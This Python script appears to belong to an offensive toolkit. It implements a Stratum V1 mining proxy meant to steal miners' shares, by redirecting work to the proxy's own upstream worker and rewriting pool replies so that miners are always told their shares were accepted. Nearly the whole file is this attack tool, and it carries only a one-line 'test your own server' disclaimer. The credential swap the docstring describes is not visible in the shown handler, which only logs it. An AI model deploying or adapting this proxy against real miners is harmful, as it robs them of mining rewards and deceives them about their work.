#!/usr/bin/env python3
"""Stratum V1 Mining Proxy - Share Theft Implementation

This proxy intercepts mining.submit messages from miners, replaces the worker
credentials with its own, forwards to upstream, and lies to the miner about
acceptance.

For testing against your own stratum server implementation only.
"""

import argparse
import asyncio
import signal

from minesploit.protocols.stratum.proxy import StratumProxy


class StratumStealProxy(StratumProxy):
    def __init__(self, *args, **kwargs):
        super().__init__(*args, **kwargs)
        self.on_miner_message(self._handle_miner_message)
        self.on_pool_message(self._handle_pool_message)

    def _handle_miner_message(self, message: dict) -> dict | None:
        method = message.get("method")
        if method == "mining.submit":
            original_worker = message.get("params", [""])[0]
            self._logger.info(f"STEAL: worker '{original_worker}' -> '{self.upstream_user}'")
        return message

    def _handle_pool_message(self, message: dict) -> dict | None:
        method = message.get("method")
        if method == "mining.submit" or message.get("result") is not None:
            if message.get("result") is not None:
                message["result"] = True
                self._logger.info("LIE: told miner share was accepted")
        return message


async def main():
    parser = argparse.ArgumentParser(description="Stratum Mining Proxy - Share Theft Testing Tool")
    parser.add_argument(
        "--listen",
        default="127.0.0.1:3334",
        help="Proxy listen address (default: 127.0.0.1:3334)",
    )
    parser.add_argument(
        "--upstream",
        default="127.0.0.1:3333",
        help="Upstream Stratum server (default: 127.0.0.1:3333)",
    )
    parser.add_argument(
        "--upstream-user",
        default="proxy_worker",
        help="Upstream worker name (default: proxy_worker)",
    )
    parser.add_argument(
        "--upstream-password",
        default="x",
        help="Upstream worker password (default: x)",
    )

    args = parser.parse_args()

    listen_host, listen_port = args.listen.rsplit(":", 1)
    listen_port = int(listen_port)

    upstream_host, upstream_port = args.upstream.rsplit(":", 1)
    upstream_port = int(upstream_port)

    proxy = StratumStealProxy(
        listen_host=listen_host,
        listen_port=listen_port,
        upstream_host=upstream_host,
        upstream_port=upstream_port,
        upstream_user=args.upstream_user,
        upstream_password=args.upstream_password,
    )

    loop = asyncio.get_running_loop()

    def signal_handler():
        print("\n[PROXY] Shutting down...")
        asyncio.create_task(proxy._stop_async())

    for sig in (signal.SIGINT, signal.SIGTERM):
        loop.add_signal_handler(sig, signal_handler)

    try:
        await proxy._start_async()
    except KeyboardInterrupt:
        pass
    finally:
        await proxy._stop_async()


if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        pass
